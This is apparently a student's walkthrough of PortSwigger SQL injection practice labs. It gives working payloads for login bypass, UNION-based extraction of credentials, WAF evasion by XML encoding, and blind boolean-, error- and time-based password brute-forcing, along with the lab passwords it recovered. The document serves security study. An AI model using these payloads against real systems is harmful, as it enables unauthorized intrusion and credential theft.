<br/>

- SQLi (SQL Injection) is a web security vulnerability allowing an attacker to interfere with the queries that an application makes to its database.

- Essentially allowing the attacker to retrieve and view data which they are usually not supposed to have access to.

- Data can also be manipulated by the attacker either by modifying, deleting or causing changes to the behavior of the content.

# Impacts of SQLi

- Leakage of personal/private information → passwords, credit card details, personal user info

- Reputation damage to the company and regulatory fines to to be paid

- Potentially allows an attacker to obtain a persistent backdoor and go unnoticed for a long time

<br/>

# Examples of Injection

- **Retrieving hidden data → **modifying SQL query to return additional results

- **Subverting application logic → **changing query to affect the logic of the application

- **UNION attacks → **retrieving data from different database tables

- **Examining the database** → extracting version and structure information about the database

- **Blind SQL Injection → **results of query are not shown in the responses of the application

# SQL Cheatsheet

[https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

<br/>

## Retrieval of Hidden Data

### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

<br/>

![Untitled](3ca2fe4c_Untitled.png)

- **Shopping application that displays products in different categories**

<br/>

<br/>

![Untitled](cb8ac599_Untitled.png)

- Filtering for accessories only

<br/>

![Untitled](63bf6400_Untitled.png)

- Using the URL bar to inject the query

- When filtering for a specific product category, the web app makes an SQL query to retrieve all products from the database which are relevant

<br/>

- **Original Query:**


```sql
SELECT * FROM products WHERE category = 'Accessories' AND released = 1
```

- Based on the query above, the application is vulnerable to SQLi

<br/>

- **Injection in URL Bar**:


```plain text
https://insecure-website.com/products?category=Accessories'--
```

<br/>

**Injected Query:**


```sql
SELECT * FROM products WHERE category = 'Accessories'--' AND released = 1
```

- This comments out the portion of the query where `**released = 1**`** , **therefore displaying all the unreleased products as well.

<br/>

<br/>

![Untitled](2a79c5c2_Untitled.png)

- Successful attempt at retrieving hidden data

<br/>

### Example 2:

Instead of just retrieving all items which are released and unreleased from a single category, an attacker can also create another query which allows the attacker to display all items from all categories.

<br/>

**Injection in URL Bar:**


```sql
https://insecure-website.com/products?category=Accessories'+OR+1=1--
```

<br/>

**Full Query:**


```sql
SELECT * FROM products WHERE category = 'Accessories' OR 1=1--' AND released = 1
```

<br/>

The query above will essentially check if the category is ‘Accessories’ or `1=1` and comment out the rest of the query where `released = 1` . As a result, this will display items from all categories including those which are unreleased. 

<br/>

![Untitled](341230e5_Untitled.png)

- Successful injection attempt at retrieving data from all categories

<br/>

## Lab: SQL injection vulnerability allowing login bypass

<br/>

For instance a log in page with a username and password that uses an SQL query to check the credentials by performing an SQL query to authenticate the user.


```sql
SELECT * FROM users WHERE username = 'administrator' AND password = 'admin123'
```

<br/>

An attacker can manipulate this type of login query by commenting out the password entirely.

<br/>

**Full Query:**


```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

<br/>

As a result, the query returns the username **administrator** and logs the attacker in as that user.

<br/>

<br/>

![Untitled](040b5b02_Untitled.png)

![Untitled](1d312a4c_Untitled.png)

- **Successfully logged in as Administrator**

<br/>

## Union Attacks

Union attacks allows the attacker to retrieve data from other tables within the database using the **UNION** keyword which allows the attacker to run another **SELECT **query by appending it to the end of the original query.

<br/>

 **Application Query:**


```sql
SELECT name, description FROM products WHERE category = 'Accessories'
```

<br/>

**Modified Query:**


```sql
SELECT name, description FROM products WHERE category = 'Accessories' UNION SELECT username, password from users--
```

Basically, the query will now display all products from the **Accessories** category but will now also display the username and password from the **users **table.

<br/>

### Lab: Determining the number of columns required returned by the query

- Two effective methods to determine how many columns returned from the query

	- ORDER BY

	- UNION SELECT payloads specifying different number of NULL values

<br/>

**ORDER BY**

- Increment the specified column index until an error occurs

- An error indicates that the column index is out of range

- `n-1` upon finding the error for the number of rows

<br/>

- Example: 


```sql
'' ORDER BY 1--
'' ORDER BY 2--
'' ORDER BY 1--
```

<br/>

**UNION SELECT NULL**


```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
```

- In this case, the number of NULLs will represent the number of columns

- An error will be returned unless the number of NULLs match the number of columns

- *Note: if it’s an Oracle database, specify the table (FROM)**** → e.g. dual***

	- **dual **is dummy table to be used for the purpose of arithmetic operations to be done usually

- The reason for using NULLs is because it is convertible to commonly used data types

<br/>

![Untitled](1c49ce20_Untitled.png)

- Determining the number of columns using Burp Suite

<br/>

### Lab: Finding a column containing text

- Usually the data to be retrieved will be in string form (such as usernames and password hashes)

- By using the **UNION SELECT NULL** with the number of columns determined, we can swap out one of the **NULL **values with a string to test it

- If an error is returned, then it’s not a string value

<br/>

**SQL Query (assuming there are 4 columns)**


```sql
' UNION SELECT 'a', NULL, NULL, NULL--
' UNION SELECT NULL, 'a', NULL, NULL--
' UNION SELECT NULL, NULL, 'a', NULL--
' UNION SELECT NULL, NULL, NULL, 'a'--
```

<br/>

<br/>

![Untitled](b60f2fd2_Untitled.png)

- Determining the column which uses the string data type

<br/>

### Lab: Retrieving data from other tables

- Prerequisite: Determining the table names

- **Query Injected**:


```sql
' UNION SELECT username, password FROM users--
```

<br/>

As a result, the data can be extracted from other tables such as the `**username**`** **and `**password**`** **columns from the `**users**` table in this case.

<br/>

![Untitled](fbbcb5d6_Untitled.png)

- Results in **Burp Suite**

<br/>

<br/>

![Untitled](d6445f3f_Untitled.png)

- **Results in the web application**

<br/>

### Lab: Retrieving multiple values within a single column

- Retrieve multiple rows worth by concatenating values together

- `|| '~' ||` represents the delimiter in this case

<br/>

**Sample Query on Oracle Database:**


```sql
''UNION SELECT username || '~' || password FROM users--
```

<br/>

**Query Injected:**


```sql
''UNION SELECT NULL,username ||'~'|| password FROM users--
```

<br/>

![Untitled](2bf61f8f_Untitled.png)

<br/>

## Examining the Database

### Lab: Querying database type and version (Oracle Database)

- Queries for some popular database types

![Untitled](e0d789ca_Untitled.png)

- `version` represents global variable which consists of the version information of the host

<br/>

![Untitled](eb27bdbe_Untitled.png)

- Results in **Burp Suite:**

<br/>

![Untitled](71a04693_Untitled.png)

- Query output displayed in the web application

<br/>

**SQL Query Used:**


```sql
' UNION SELECT banner, NULL FROM v$version ORDER BY 2--
```

<br/>

<br/>

**More information about v$version in Oracle:**

`**v$version**` displays the version number of Oracle Database. The database components have the same version number as the database, so the version number is returned only once.

 | Column | Datatype | Description | 
 | ---- | ---- | ---- | 
 | BANNER | VARCHAR2(80) | Component name and version number | 
 | BANNER_FULL | VARCHAR2(160) | The newline banner format introduced in Oracle Database 18c. The banner displays the database release and version number. | 
 | BANNER_LEGACY | VARCHAR2(80) | The legacy 1 line banner used before Oracle Database 18c. This column displays the same value as the BANNER column | 
 | CON_ID | NUMBER | The ID of the container to which the data pertains. Possible values include:
0: This value is used for rows containing data that pertain to the entire CDB. This value is also used for rows in non-CDBs.
1: This value is used for rows containing data that pertain to only the root
n: Where n is the applicable container ID for the rows containing data | 

<br/>

### Lab: Querying database type and version (MySQL and MSSQL)

<br/>

Similar to Oracle Database, however, it does not require to `**SELECT**`** **from any specific table and the comments are `##` instead of `--`. 

![Untitled](68f02330_Untitled.png)

**SQL Query Injection for MySQL and MSSQL**


```sql
' UNION SELECT @@version##
```

- Output of query via Burp Suite

<br/>

![Untitled](86764dd1_Untitled.png)

- Output of query via the web application

<br/>

**Query Injected:**


```sql
' UNION SELECT @@version,NULL##
```

<br/>

### Lab: Listing Contents of the Database

Most database types (*with the notable exception of ****Oracle***) have a set views called the information schema which provide information about the database.

<br/>

Query `information_schema.tables` to list database tables

**Sample Query:**


```sql
SELECT * FROM information_schema.tables
```

<br/>

<br/>

**Sample Query Output:**

![Untitled](2de46bdf_Untitled.png)

Based on the output, there are a total of three tables which are **Products, Users and Feedback. **With this, it is possible to query specific information from the tables. For instance:

<br/>

**Sample Query:**


```sql
SELECT * FROM information_schema.tables WHERE table_name= 'Users'
```

- Query will be used to display all columns within the “Users” table

<br/>

<br/>

### Lab: Listing Information from Database (Not Oracle):

***Note: ****The number of columns and the datatype of the columns must be determined first*

<br/>

Upon determining the number of columns and the datatype of the columns, the first thing to do is list out all tables within the `information_schema` which provides information about the database contents.

<br/>

**Listing all tables within **`information_schema.tables` using **Burp Suite:**  

![Untitled](3af287aa_Untitled.png)

**Query Injected:**


```sql
' UNION SELECT table_name, NULL from information_schema.tables ORDER BY 2--
```

- After listing out all the tables within the database, the one which seemed to be the most relevant was `users_dragfx` for containing user credentials.

<br/>

The `users_dragfx` can then be used to craft a query which is able to list out all the columns within the database.

<br/>

<br/>

![Untitled](76e89471_Untitled.png)

**Query Injected:**


```sql
'' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_dragfx'--
```

<br/>

By injecting the queries, there were two columns that seemed to be more relevant than the others when it came to the user credentials. The columns are:

- `username_vubkdl` → usernames

- `password_feplht` → passwords




![Untitled](86bccc31_Untitled.png)

**Query Injected:**


```sql
' UNION SELECT username_vubkdl, password_feplht FROM users_dragfx--
```

<br/>

**User Credentials:**

 | **Usernames** | **Passwords** | 
 | ---- | ---- | 
 | administrator | t89xbgj56ldltrxo24mj | 
 | carlos | mgdg1ppgpajf8b1883ax | 
 | wiener | 7klwcouj6w9s43f4guyx | 

<br/>

![Untitled](e69917df_Untitled.png)

- **Successfully logged in as Administrator**

<br/>

<br/>

### Listing Information from Database (Not Oracle) Lab:

<br/>

***Note: ****The number of columns and the datatype of the columns must be determined first*

<br/>

First, we need to start by listing out the tables found in the database.

<br/>

![Untitled](90f8a783_Untitled.png)

**Query Injected:**


```sql
' UNION SELECT table_name, NULL FROM all_tables--
```

<br/>

**Output:**

![Untitled](3460c624_Untitled.png)

- In this case, the most relevant to use is the `USERS_LXUXKC` table which should contain the usernames and passwords of all users.

<br/>

<br/>

![Untitled](6b5d3ec9_Untitled.png)

**Query Injected:**


```sql
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_LXUXKC'--
```

- The query above essentially displays all the column names within the table named `USERS_LXUXKC`. 

- The two columns that are most likely to contain the user credentials are `USERNAME_DZLIPE` and `PASSWORD_SCZFUD`.

- The column names will be useful when trying to craft query to obtain data from specific columns in the table.

With the the columns obtained, a proper query can be crafted to obtain the user credentials.

<br/>

![Untitled](10176165_Untitled.png)

<br/>

**Query Injected:**


```sql
' UNION SELECT USERNAME_DZLIPE, PASSWORD_SCZFUD FROM USERS_LXUXKC--
```

- The query will essentially extract the `USERNAME_DZLIPE` and `PASSWORD_SCZFUD` columns from the `USERS_LXUXKC`

<br/>

**User Credentials:**

 | **Usernames** | **Passwords** | 
 | ---- | ---- | 
 | administrator | 43kdwuj4rjtg2vua5pl1 | 
 | carlos | yq4r34kvd1p264rilmsc | 
 | wiener | 7u7fy3yx7jvvh2hljqfj | 

<br/>

![Untitled](c932c1d6_Untitled.png)

![Untitled](39cc2bf5_Untitled.png)

- **Successfully logged in as Administrator**

<br/>

<br/>

<br/>

## Blind SQL Injection

<br/>

### Lab: Blind SQL injection with conditional responses

<br/>

In this case, the tracking cookie is vulnerable to an SQL injection.

`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

<br/>

A request containing a `TrackingId` cookie is processed and along with that the application determines if its a known user using an SQL query.

<br/>

**Sample Query:**


```sql
SELECT TrackingId FROM TrackedUsers WHERE TradckingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Although the query is vulnerable as SQLi, the query results will not be returned to the user. Hence, a blind SQLi injection needs to be performed with its success being determined based on the behaviour of the web application.

<br/>

The lab mentions that there is a “Welcome back” message which will be displayed on the web application depending on query injected. An SQL query can be injected to confirm this.

<br/>

**Query injected:**


```sql
TrackingId=xyz' AND '1'='1--
TrackingId=xyz' AND '1'='2--
```

<br/>

<br/>

![Untitled](14efc15f_Untitled.png)

- “Welcome back” message appears when 1=1 (which is true)

<br/>

<br/>

![Untitled](07600fc1_Untitled.png)

- “Welcome back” message does not appear when 1=2 (which is false)

<br/>

<br/>

![Untitled](f80194c2_Untitled.png)

Another verification query needs to be sent to determine if the **users **table exists.

<br/>

**Query injected:**


```sql
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'--
```

- Searches for the first record of “a” in the **users **table and confirms it

- `LIMIT 1` in this case ensures that only one is taken into account

<br/>

<br/>

![Untitled](7a6a42e4_Untitled.png)

With the **users** table found, an **administrator **user needs to be determined. In this case, it can be tested by issuing the query below:


```sql
TrackingId=xyz' AND (SELECT 'a' FROM users where username='administrator')='a'--
```

- In this case, it proves that the admin user name is “administrator”

<br/>

<br/>

Next, the password length of the administrator account needs to be determined which can also be done by injecting another query


```sql
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--
```

- The query will essentially get the password of the **administrator **account and verify that the length of the password is less than 1.

- The length of the password will be incremented each time until the “Welcome back” message is no longer shown in the response.

- To make this process more efficient **Burp Suite’s Intruder** feature can be used to brute force it

<br/>

![Untitled](be226917_Untitled.png)

- Setting intruder attack type and payload positions

<br/>

**Payload Settings:**

![Untitled](8c467ec9_Untitled.png)

- Payload setting in this case is using a range of numbers from 1 to 30 which increments by 1 each time

<br/>

<br/>

![Untitled](5186778f_Untitled.png)

- Grep Match is used with the phrase “Welcome back!” to filter the responses

<br/>

![Untitled](d8c77375_Untitled.png)

- From the brute force attempt, it shows that the password length is a total of 20 characters

- With the number of characters of the password determined, it can finally be brute forced.

<br/>

<br/>

<br/>

![Untitled](69e7f747_Untitled.png)


```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username = 'administrator')='a'--
```

- Attack type set is cluster bomb

- The `SUBSTRING` function in SQL  is used to select a specific character position when brute forcing the password in this case

<br/>

<br/>

![Untitled](5d7d9a13_Untitled.png)

- The first payload sets uses a number range of 1 to 20 characters 

<br/>

![Untitled](204caeed_Untitled.png)

- The second payload set includes Alphanumeric payload using lowercase letters only

<br/>

<br/>

![Untitled](4c54aabd_Untitled.png)

- **Grep Match **feature is used to specify for the “Welcome back!” phrase in the responses

<br/>

<br/>

![Untitled](fba26424_Untitled.png)

- The password brute force results are shown above

- The grep match for “Welcome back!” will be labeled as 1 if it is found within the response

- When ordered correctly, the password is **sgoqvwiuw028xv51cmlx**

<br/>

<br/>

![Untitled](a183f8f6_Untitled.png)

![Untitled](5a38369e_Untitled.png)

- **Successfully logged in as Administrator**

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

<br/>

### Lab: Blind SQL with conditional errors

<br/>

**Vulnerability: **TrackingId Cookie is vulnerable to SQL Injections

<br/>

![Untitled](46c9ac2a_Untitled.png)

- Adding a single quote to the tracking ID to test for syntax errors

- Server error is shown which could potentially indicate a syntax error

<br/>

<br/>

![Untitled](58226ac3_Untitled.png)

- Adding quotes to the tracking ID to test for syntax errors

- No error is returned

- Syntax error has been dealt with

- All injections in this case need to be done within the single quotes for this scenario

<br/>

<br/>

![Untitled](b568d6df_Untitled.png)

- Testing if the  server can interpret an SQL query

- Server is unfortunately unable to interpret the SQL query

- This could mean that it is an Oracle database which requires a specific table for data to be extracted from

**Query Injected:**


```sql
'|| (SELECT '') ||'
```

<br/>

<br/>

![Untitled](8ba2cd48_Untitled.png)

- Server can be confirmed to be using **Oracle Database**

**Query Injected:**


```sql
'|| (SELECT * FROM dual) ||'
```

<br/>

<br/>

![Untitled](c54b1050_Untitled.png)

**Query Injected:**


```sql
'|| (SELECT * FROM nothing) ||'
```

- Confirms that data needs to be extracted from a table that exists

- This concludes that is an Oracle Database

<br/>

<br/>

![Untitled](0bec4d7e_Untitled.png)

**Query:**


```sql
'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
```

- Selecting a single entry from the users table

- **ROWNUM = 1** ensures that there is only one row number

![Untitled](5181bb70_Untitled.png)

<br/>

<br/>

**Query Injected:**


```sql
'||(SELECT '' FROM users WHERE username='administrator')||'
```

- Selects entries within the users table where the username = ‘administrator’

<br/>

<br/>

![Untitled](09f8995f_Untitled.png)

**Query Injected:**


```sql
'||(SELECT '' FROM users WHERE username='administratorasdlkfasdf')||'
```

- Supposedly this should not work as that is not the username for the administrator

- Shows that this method of exfiltrating data is unreliable

- Confirms that directly checking for the administrator account is unreliable

<br/>

<br/>

![Untitled](1794c857_Untitled.png)

**Query:**

- Forcing errors based on conditions to exfiltrate data


```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual||'
```

- When 1=1, it displays a server error which shows that the conditional query worked

- **TO_CHAR(1/0)** is what triggers the error due to the fact that 1 is divided by 0

<br/>

<br/>

![Untitled](26ca6ca0_Untitled.png)

**Query:**


```sql
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

- Forcing errors based on conditions to exfiltrate data

- Similar from before but this time the case is “1=2” which is false and hence does not cause an error based on the condition

<br/>

<br/>

![Untitled](1ccc9e91_Untitled.png)

**Query Injected:**


```sql
'|| SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

- Confirming the existence of the “administrator” username

- Query confirms of the existence of the** “administrator” **username within the **users **table

<br/>

<br/>

![Untitled](432fb3c4_Untitled.png)

**Query Injected:**


```sql
'|| (SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

- Determines the length of the password for the administrator account

- Query injected shows that the administrator password length is more than 1

- Password length needs to be checked incrementally until it does not show an error

- Using **Burp Intruder** will be more efficient

<br/>

<br/>

![Untitled](9af412dc_Untitled.png)

- Sniper attack type is used as only the password length needs to be brute forced first

<br/>

![Untitled](c78ac19a_Untitled.png)

- The payload set uses a number range of 1 to 30 characters to determine the password length

<br/>

![Untitled](fca344f8_Untitled.png)

- Results shows that the password is not more than 20 characters long as it does not return an error after the 20th entry

- Next is to brute force the password incrementally based on the position of each character

<br/>

<br/>

![Untitled](00d5157e_Untitled.png)

- **Cluster bomb **attack type is used because there are two parts to brute force consisting of the password position and the character in that position

- **Query:**


```sql
'||SELECT CASE WHEN (SELECT SUBSTRING(password,1,1)='a')) THEN TO_CHAR(1/0) ELSE '' END users where username='administrator'||'
```

<br/>

<br/>

![Untitled](3eac0098_Untitled.png)

- Payload set 1 uses a range of numbers from 1 to 20

<br/>

![Untitled](b042d525_Untitled.png)

- Payload set 2 uses lowercase alphanumeric characters for the characters to be brute forced

<br/>

<br/>

![Untitled](b1e346f9_Untitled.png)

- **Grep-Match **is used in this case to specify for responses containing the phrase** “Internal Server Error”** as it will be an indicator when the character matches the actual password

<br/>

<br/>

![Untitled](cfadb2cc_Untitled.png)

- Password for the administrator account was successfully brute forced

- **Full password is q8nwjwj6m10to9c2hp87 **

<br/>

<br/>

![Untitled](4f5537a0_Untitled.png)

![Untitled](5a10dd10_Untitled.png)

- **Successfully Logged in as Administrator**

<br/>

<br/>

### Lab: Blind SQL with time delays

<br/>

**Time Delay Cheatsheet:**

![Untitled](dfe8fe01_Untitled.png)

<br/>

![Untitled](c612e8ef_Untitled.png)

**Query Injected:**


```sql
'||pg_sleep(5)--
```

- Testing for time delay on a PostgresSQL server

<br/>

![Untitled](402e487e_Untitled.png)

- Indicates that it is a **Postgres **database hence why the time delay worked

<br/>

<br/>

<br/>

### Lab: Blind SQL injection with time delays and information retrieval

<br/>

<br/>

![Untitled](dee64ae3_Untitled.png)

**Query Injected:**


```sql
; SELECT pg_sleep(10)--
```

- To determine the type of database according to the time delay

- Has 10 second delay indicating that it is a **Postgresco **database

<br/>

<br/>

![Untitled](a3b1e738_Untitled.png)

![Untitled](6afd2f34_Untitled.png)

**Query:**


```sql
';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

-  Query is used to test for conditions

- Condition whereby** “1=1”** causes time delay for the response to be received

<br/>

<br/>

![Untitled](de850683_Untitled.png)


```sql
';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

- To confirming reliability of conditional query

- The query does not result in time delay when** “1=2” **which ensures that it works.

<br/>

<br/>

![Untitled](2b4f432d_Untitled.png)

![Untitled](b2fc61f6_Untitled.png)


```sql
';SELECT CASE WHEN (username = 'administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

- This confirms if the “administrator” username exists within the users table

- There was a time delay which indicates that the “**administrator” **username exists within the **users **table

- Next is to use the **Intruder **to perform a brute force to determine the password length

<br/>

<br/>

![Untitled](e0c9dac6_Untitled.png)

**Query Injected:**


```sql
'; SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
```

- Attack type is set as sniper as there is only one payload

- Payload position will be set for the password length which needs to be incremented

<br/>

<br/>

![Untitled](5006d564_Untitled.png)

- Payload used consists of numbers between the range of 1 and 30 with an increment of 1 per request

<br/>

![Untitled](a244af51_Untitled.png)

- Resource Pool of 1 for results to be accurate due to the time delay factor which is checked per request

<br/>

<br/>

![Untitled](cc9305e0_Untitled.png)

- Brute forcing the length of the administrator password

- **Response received** column should be checked to view the time delay

<br/>

![Untitled](3020f73c_Untitled.png)

**Query:**


```sql
';SELECT CASE WHEN (username = 'administrator' AND LENGTH(password)>20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

- Brute forcing the password length shows that it is 20 characters in length

- With that information, a brute force can be done to determine the full password of the administrator account

<br/>

<br/>

![Untitled](32092687_Untitled.png)

**Query Injected for Brute Force:**


```sql
';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
```

- Setting attack type and payload position for full password brute force

- Attack type used is **Sniper**

- It will be done by manually incrementing the character position of the password due to the throttling issue in **Burp Suite Community Edition**

<br/>

![Untitled](fcaf362f_Untitled.png)

- Payload set is alphanumeric character set consisting only of lowercase letters and numbers

<br/>

<br/>

![Untitled](c2045bb4_Untitled.png)

- Selecting resource pool of 1 to accurately view the time delay in the responses during the password brute force

<br/>

<br/>

![Untitled](109e922a_Untitled.png)

- Increment the character position of the password to brute force and repeat until getting the full password

- **Full password: 5bbvho721ioctyaynjyp**

<br/>

<br/>

![Untitled](7400aeba_Untitled.png)

![Untitled](692a00d9_Untitled.png)

- **Successfully Logged in as Administrator**

<br/>

### Lab: SQL injection with filter bypass via XML encoding

**Vulnerability: **SQL Injection vulnerability in stock check feature

<br/>

![Untitled](277b68a4_Untitled.png)

![Untitled](35f435c0_Untitled.png)

- Hackvertor extension is needed to obfuscate the payload using XML Entities

- This is done to bypass the WAF (Web Application Firewall) in place

<br/>

<br/>

![Untitled](b38c8fa9_Untitled.png)

- Vulnerable stock check feature on the web application

<br/>

<br/>

![Untitled](cdb5ea9e_Untitled.png)

- Intercepted the stock check POST request

- Queries will be injected in the `storeID` tags

<br/>

![Untitled](930264a1_Untitled.png)

- Performing basic addition operation for testing

<br/>

<br/>

![Untitled](427b8e79_Untitled.png)

**Query Injected:**


```sql
UNION SELECT NULL
```

- Testing using an SQL Injection for a basic Union Attack

- Attack was detected by the **Web Application Firewall (WAF)**

- **WAF **needs to be **bypassed **for the injection to work

<br/>

<br/>

![Untitled](0b59028f_Untitled.png)

- Using dec_entities to obfuscate the payload

- Encoding the SQL query in `dec_entities` or `hex_entities` in this case to bypass the **WAF**

<br/>

<br/>

![Untitled](9694a1c3_Untitled.png)

- “null” being appearing in the response indicates that the query was successful

<br/>

<br/>

![Untitled](1cf40ce1_Untitled.png)

**Query Injected:**


```sql
UNION SELECT table_name FROM information_schema.tables
```

- Dumped all the table names within the database

- Table containing user credentials is the** “users” **table

<br/>

<br/>

![Untitled](95acc34a_Untitled.png)

**Query Injected:**


```sql
UNION SELECT column_name FROM information_schema.columns where table_name='users'
```

- Dumped all the columns names within the **users** table

- Columns found:

	- **password**

	- **username**

	<br/>

![Untitled](a7edd1f2_Untitled.png)

**Query Injected:**


```sql
UNION SELECT username || '::' || password FROM users
```

- Dumps all the user credentials from the **password **and **username **columns from the **users **table

- Usernames and passwords will be concatenated for easy viewing

- **User Credentials:**

 | **Username** | **Password** | 
 | ---- | ---- | 
 | administrator | k2g1cftjmx8shpqcilyp | 
 | carlos | 7qty2dot2r1ivuciil5b | 
 | wiener | 3pjuwbpfsyz6wpr9wnno | 

<br/>

![Untitled](8d29fa3b_Untitled.png)

![Untitled](ec17bdb5_Untitled.png)

- **Successfully logged in as Administrator**

<br/>

### Bind SQL injection with out-of-band interaction

- Unable to be done due to the requirement of **Burp Suite Professional **for **Burp Collaborator**

<br/>

### Blind SQL Injection with out-of-band data exfiltration

- Unable to be done due to the requirement of **Burp Site Professional **for **Burp Collaborator**

